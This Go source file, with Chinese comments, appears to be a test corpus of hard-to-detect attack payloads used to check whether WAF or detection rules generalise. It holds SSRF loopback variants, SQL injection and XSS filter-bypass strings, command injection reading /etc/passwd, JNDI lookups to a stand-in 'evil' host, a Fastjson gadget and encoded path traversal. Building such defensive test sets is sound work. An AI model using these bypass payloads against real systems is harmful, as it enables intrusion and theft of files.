package payloads

// HardCases 是 W3 第二轮对抗用的「更难变形」语料。
//
// 目的不是提高拦截率，而是检验**泛化能力**：这些样本不在 W1/W2 的参照集里，
// 如果规则只是拟合了已知语料，这里会集中暴露。
//
// 覆盖思路：
//   - SSRF：十进制/十六进制/IPv6 映射/短写形式的回环地址
//   - SQLi：MySQL 版本注释、关键字中间插注释、大小写+注释混合
//   - XSS：嵌套标签拆分、Unicode 转义
//   - RCE：$IFS 分隔符、反引号内空格
//   - 反序列化：JNDI 嵌套展开、非 base64 魔数形态
//   - 遍历：超长 UTF-8 编码的斜杠（..%c0%af）
func HardCases() []Case {
	return []Case{
		// ---- SSRF 变体（数值化回环）----
		qp("W3-HARD-SSRF-001", "ssrf", "十进制回环 IP", "/fetch", "url="+urlEnc("http://2130706433:6379/"), true),
		qp("W3-HARD-SSRF-002", "ssrf", "十六进制回环 IP", "/fetch", "url="+urlEnc("http://0x7f000001:6379/"), true),
		qp("W3-HARD-SSRF-003", "ssrf", "IPv6 映射回环", "/fetch", "url="+urlEnc("http://[::ffff:127.0.0.1]:8080/"), true),
		qp("W3-HARD-SSRF-004", "ssrf", "短写回环 127.1", "/fetch", "url="+urlEnc("http://127.1:6379/"), true),
		qp("W3-HARD-SSRF-005", "ssrf", "内网 172.16 段", "/fetch", "url="+urlEnc("http://172.16.0.10/admin"), true),

		// ---- SQLi 变体（注释与拆分）----
		q("W3-HARD-SQLI-001", "sqli", "MySQL 版本注释", "id=1%20/*!50000union*/%20select%201", true),
		q("W3-HARD-SQLI-002", "sqli", "关键字中间插注释", "id=1%20un/**/ion%20se/**/lect%201", true),
		q("W3-HARD-SQLI-003", "sqli", "大小写+注释混合", "id=1%20UnIoN/*x*/SeLeCt%201", true),
		q("W3-HARD-SQLI-004", "sqli", "括号包裹恒真式", "id=1%20and%20(1)=(1)", true),

		// ---- XSS 变体（拆分与转义）----
		qp("W3-HARD-XSS-001", "xss", "嵌套标签拆分", "/comment", "c="+urlEnc("<scr<script>ipt>alert(1)</script>"), true),
		qp("W3-HARD-XSS-002", "xss", "Unicode 转义", "/comment", "c="+urlEnc(`\u003cscript\u003ealert(1)\u003c/script\u003e`), true),
		qp("W3-HARD-XSS-003", "xss", "SVG 斜杠分隔", "/comment", "c="+urlEnc("<svg/onload=alert(1)>"), true),

		// ---- RCE 变体（分隔符替换）----
		qp("W3-HARD-RCE-001", "rce", "$IFS 分隔符", "/ping", "host="+urlEnc("1.1.1.1;cat$IFS/etc/passwd"), true),
		qp("W3-HARD-RCE-002", "rce", "反引号含空格", "/ping", "host="+urlEnc("` id `"), true),

		// ---- 反序列化变体 ----
		Case{ID: "W3-HARD-DESER-001", Category: "deserialization", Name: "JNDI 嵌套 lower 展开",
			Method: "GET", Path: "/", UA: "${jndi:${lower:l}dap://evil/a}", IsAttack: true},
		Case{ID: "W3-HARD-DESER-002", Category: "deserialization", Name: "JNDI env 前缀绕过",
			Method: "GET", Path: "/", UA: "${${env:FOO:-j}ndi:ldap://evil/a}", IsAttack: true},
		b("W3-HARD-DESER-003", "deserialization", "Fastjson 无引号数字类型",
			`{"@type" : "java.lang.AutoCloseable", "x":1}`, true),

		// ---- 路径遍历变体（超长编码斜杠）----
		qp("W3-HARD-TRAV-001", "path-traversal", "超长 UTF-8 斜杠", "/download", "f=..%c0%af..%c0%afetc%c0%afpasswd", true),
	}
}
